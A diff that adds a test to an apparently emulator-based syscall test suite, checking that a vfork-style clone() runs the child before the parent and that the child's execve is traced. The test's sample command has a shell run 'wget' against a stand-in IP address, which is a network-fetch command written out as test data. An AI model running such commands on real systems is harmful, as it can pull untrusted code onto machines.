@@ -370,3 +370,23 @@ def test_epoll_wait_with_nothing_to_wake_it_is_a_deadlock_not_a_spin():
     p.call("epoll_wait", 3, out, 8, 0xFFFFFFFFFFFFFFFF)     # so does main
     p.exit(0)
     assert _run(p).stop_reason == "deadlock"
+
+
+
+def test_vfork_style_clone_without_clone_thread_runs_the_child_then_the_parent():
+    """posix_spawn()/system() use clone(CLONE_VM|CLONE_VFORK|SIGCHLD) on a separate child stack."""
+    p = X64Prog()
+    sh, dashc, cmd = p.cstr("/bin/sh"), p.cstr("-c"), p.cstr("wget http://198.51.100.7/x")
+    argv, slot = p.ptrs(sh, dashc, cmd, 0), p.d(b"\0" * 8)
+    p.call("clone", 0x4111, _thread_stack(p), 0, 0, 0)          # CLONE_VM | CLONE_VFORK | SIGCHLD
+    p.jnz("parent")
+    p.call("execve", sh, argv, 0)                                # child
+    p.exit(1)
+    p.label("parent")
+    p.store_rax(slot)
+    p.call("write", 1, slot, 8)
+    p.exit(0)
+    r = _run(p)
+    execve = next(e for e in r.events if e["syscall"] == "execve")
+    assert execve["argv"] == ["/bin/sh", "-c", "wget http://198.51.100.7/x"]
+    assert struct.unpack("<Q", r.stdout)[0] == 1001 and r.stop_reason == "exit(0)"
